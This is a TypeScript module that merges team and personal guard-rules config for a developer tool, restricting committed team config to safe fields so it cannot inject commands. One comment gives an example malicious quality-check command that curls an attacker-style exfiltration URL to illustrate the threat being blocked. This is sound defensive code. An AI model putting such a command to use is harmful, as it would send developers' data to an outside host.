// ===========================================
// Rules — Config Merging
// ===========================================
// Merges team config (`.interlinked/guard-rules.json`) and personal
// overrides (`.interlinked/guard-rules.local.json`) into the default
// config produced by `rules/default-config.ts`.
//
// Security note: team config is committed, so any arbitrary `command`
// field could silently execute on every developer's machine. We allow
// team config to toggle safe fields only — see QUALITY_CHECK_SAFE_FIELDS.

import {
	DEFAULT_METACODER_CONFIG,
	USER_PROMPT_HOOK_TIMEOUT_MS,
	type MetacoderConfig,
} from "../metacoder/types.js";
import type { GuardRulesConfig, QualityCheckConfig } from "../types.js";

/** Minimum buffer between the metacoder's internal timeout and the
 *  user-prompt hook timeout. With less than this, the hook can destroy
 *  the socket while the harness is still finalizing its "metacoder timed
 *  out, allow" reply, producing a spurious cold-fallback. Plan §6 + plan
 *  §reviewer-P2 (round 5). */
const METACODER_HOOK_BUFFER_MS = 2_000;

/** Hard upper bound for `metacoder.timeout_ms`. Derived from the hook
 *  timeout so changing one constant automatically tightens the other —
 *  no drift between merge-time clamp and hook-script generation. */
const METACODER_TIMEOUT_HARD_CAP_MS = USER_PROMPT_HOOK_TIMEOUT_MS - METACODER_HOOK_BUFFER_MS;

/** Clamp `metacoder.timeout_ms` so user config can never set a value that
 *  races the hook's own timeout. Pure function — does not mutate input. */
function clampMetacoderConfig(cfg: MetacoderConfig): MetacoderConfig {
	if (cfg.timeout_ms > METACODER_TIMEOUT_HARD_CAP_MS) {
		return { ...cfg, timeout_ms: METACODER_TIMEOUT_HARD_CAP_MS };
	}
	return cfg;
}

/**
 * Team config (git-committed) can toggle settings but CANNOT define
 * arbitrary commands. This prevents a malicious PR from adding a quality
 * check with "command": "curl https://attacker.com/exfil" that would
 * execute on every developer's machine.
 *
 * Specifically, team config can:
 *   - Add guard rules (pattern matching only, no command execution)
 *   - Add protected file rules
 *   - Toggle quality check enabled/file_types/severity/timeout_ms on EXISTING checks
 *   - Configure curl_mcp_detection, project_specific
 *
 * Team config CANNOT:
 *   - Set or change the `command` field on quality checks
 *   - Add new quality check entries with custom commands
 */
const QUALITY_CHECK_SAFE_FIELDS = new Set([
	"enabled",
	"file_types",
	"timeout_ms",
	"severity",
	"description",
]);

/**
 * Public API — consumed by `rules/loader.ts` via `loadRules()`.
 *
 * Merges team-level config into the default config. Mutates `config`
 * in place. Ignores dangerous fields like `command` on unknown checks.
 */
export function mergeTeamRules(config: GuardRulesConfig, team: Partial<GuardRulesConfig>): void {
	if (team.enabled === false) config.enabled = false;
	if (team.rules) config.rules = team.rules;
	if (team.protected_files) config.protected_files = team.protected_files;
	if (team.file_reminders) config.file_reminders = team.file_reminders;
	if (team.curl_mcp_detection) {
		Object.assign(config.curl_mcp_detection, team.curl_mcp_detection);
	}
	if (team.quality_checks) {
		// Team config can only toggle safe fields on EXISTING checks — not add commands
		for (const [key, teamCheck] of Object.entries(team.quality_checks)) {
			const existing = config.quality_checks[key];
			if (!existing) continue; // Team cannot add new check entries
			if (!teamCheck || typeof teamCheck !== "object") continue;
			const checkOverrides: Partial<QualityCheckConfig> = teamCheck;
			for (const field of Object.keys(checkOverrides)) {
				if (!QUALITY_CHECK_SAFE_FIELDS.has(field)) continue;
				// Safe fields: enabled, file_types, timeout_ms, severity, description
				const safeKey = field as keyof Pick<
					QualityCheckConfig,
					"enabled" | "file_types" | "timeout_ms" | "severity" | "description"
				>;
				const val = checkOverrides[safeKey];
				if (val !== undefined) {
					existing[safeKey] = val as never;
				}
			}
		}
	}
	if (team.error_memory) {
		Object.assign(config.error_memory, team.error_memory);
	}
	if (team.project_specific) {
		config.project_specific = team.project_specific;
	}
	if (team.policy_classifier) {
		config.policy_classifier = team.policy_classifier;
	}
	if (team.auto_coordination) {
		config.auto_coordination = team.auto_coordination;
	}
	if (team.metacoder) {
		// Plan §reviewer-P4 (round 4): seed against DEFAULT_METACODER_CONFIG
		// so a partial team override like `{timeout_ms: 5000}` doesn't drop
		// `enabled`, `max_rules`, `max_pattern_length`, etc. Without this,
		// the overlay validator's caps disappear (max_rules undefined →
		// the cap check NaN-compares → no cap) and `enabled: undefined`
		// silently disables the metacoder.
		// Plan §reviewer-P2 (round 5): clamp `timeout_ms` to keep the
		// metacoder's internal deadline strictly below the hook timeout.
		config.metacoder = clampMetacoderConfig({
			...DEFAULT_METACODER_CONFIG,
			...config.metacoder,
			...team.metacoder,
		});
	}
	if (team.project_wide_checks && config.project_wide_checks) {
		Object.assign(config.project_wide_checks, team.project_wide_checks);
	}
}

/**
 * Public API — consumed by `rules/loader.ts` via `loadRules()`.
 *
 * Merges local (personal, gitignored) overrides into the config. Local
 * overrides are trusted because they live only on the developer's
 * machine, so they can set `command` fields and add new checks freely.
 */
export function mergeLocalOverrides(
	config: GuardRulesConfig,
	local: Partial<GuardRulesConfig>,
): void {
	if (local.disabled_rules) {
		config.disabled_rules = local.disabled_rules;
	}
	if (local.extra_exceptions) {
		config.extra_exceptions = local.extra_exceptions;
	}
	// Local can add personal file reminders (appended to team reminders)
	if (local.file_reminders) {
		config.file_reminders = [...config.file_reminders, ...local.file_reminders];
	}
	// Local can override quality checks (e.g., disable tsc on slow machines)
	if (local.quality_checks) {
		for (const [key, check] of Object.entries(local.quality_checks)) {
			if (config.quality_checks[key]) {
				Object.assign(config.quality_checks[key], check);
			} else {
				config.quality_checks[key] = check;
			}
		}
	}
	// Local can override project-wide checks (e.g., disable on slow machines)
	if (local.project_wide_checks && config.project_wide_checks) {
		Object.assign(config.project_wide_checks, local.project_wide_checks);
	}
	// Local can toggle the ML content scanner on/off and tweak individual
	// knobs. Nested blocks (`local`, `huggingface`, `custom_http`, `scan_points`)
	// are deep-merged so a partial override like `{local: {pool_size: 1}}`
	// keeps the default python_bin / sidecar_script / timeouts intact.
	// (A previous shallow `Object.assign` replaced whole nested objects and
	// silently dropped required defaults.)
	if (local.content_scanner) {
		if (config.content_scanner) {
			mergeContentScanner(config.content_scanner, local.content_scanner);
		} else {
			config.content_scanner = local.content_scanner;
		}
	}
	// Local can disable / tune the structural-checks suite. Without this branch
	// `{structural_checks: {enabled: false}}` in guard-rules.local.json was
	// silently dropped, leaving the post-event budget at 17–38 s on Writes that
	// triggered the prompt-injection scanner alongside the structural pipeline.
	// Shallow Object.assign matches the content_scanner / project_wide_checks
	// pattern in this file — nested fields are leaf booleans / numbers with no
	// internal structure that needs deep-merge.
	if (local.structural_checks) {
		Object.assign(config.structural_checks, local.structural_checks);
	}
	// Local can disable / tune the per-prompt metacoder. Without this branch
	// `{metacoder: {enabled: false}}` in guard-rules.local.json was silently
	// dropped, leaving every UserPromptSubmit doing a 30s LLM call. Plan §2.1.
	// Shallow Object.assign — MetacoderConfig is flat scalars, no nested
	// objects to deep-merge.
	if (local.metacoder) {
		// Plan §reviewer-P4 (round 4): seed against DEFAULT_METACODER_CONFIG
		// so a partial override like `{timeout_ms: 5000}` doesn't leave
		// `enabled` undefined (silently disabling the metacoder) or drop
		// the overlay validator's caps. Spread order: defaults < team
		// config < local override, so local wins on scalar conflicts.
		// Plan §reviewer-P2 (round 5): clamp timeout_ms after merge.
		config.metacoder = clampMetacoderConfig({
			...DEFAULT_METACODER_CONFIG,
			...config.metacoder,
			...local.metacoder,
		});
	}
}

/** Deep-merge overrides for the content scanner config. Nested blocks
 *  (local/huggingface/custom_http/scan_points) are field-merged so a
 *  partial override like `{local: {pool_size: 1}}` preserves the default
 *  python_bin / sidecar_script / timeouts. Scalar top-level knobs overwrite. */
function mergeContentScanner(
	target: NonNullable<GuardRulesConfig["content_scanner"]>,
	override: Partial<NonNullable<GuardRulesConfig["content_scanner"]>>,
): void {
	if (override.enabled !== undefined) target.enabled = override.enabled;
	if (override.runtime !== undefined) target.runtime = override.runtime;
	if (override.min_score !== undefined) target.min_score = override.min_score;
	if (override.max_scan_bytes !== undefined) target.max_scan_bytes = override.max_scan_bytes;
	if (override.local) Object.assign(target.local, override.local);
	if (override.huggingface) Object.assign(target.huggingface, override.huggingface);
	if (override.custom_http) Object.assign(target.custom_http, override.custom_http);
	// Allowlist is APPENDED — locals add to defaults, never replace. This keeps
	// the curated team/default list in force while letting individuals add
	// machine-specific entries (their personal noreply addresses, project-
	// specific identifiers, etc.) in guard-rules.local.json.
	if (override.allowlist && override.allowlist.length > 0) {
		target.allowlist = [...(target.allowlist ?? []), ...override.allowlist];
	}
	// disabled_labels follows the same additive convention as allowlist: locals
	// append, never replace. De-duplicated on merge so a user re-naming the
	// same label in both layers doesn't double-count it in any audit output.
	if (override.disabled_labels && override.disabled_labels.length > 0) {
		const merged = new Set([...(target.disabled_labels ?? []), ...override.disabled_labels]);
		target.disabled_labels = [...merged];
	}
	if (override.scan_points) Object.assign(target.scan_points, override.scan_points);
}
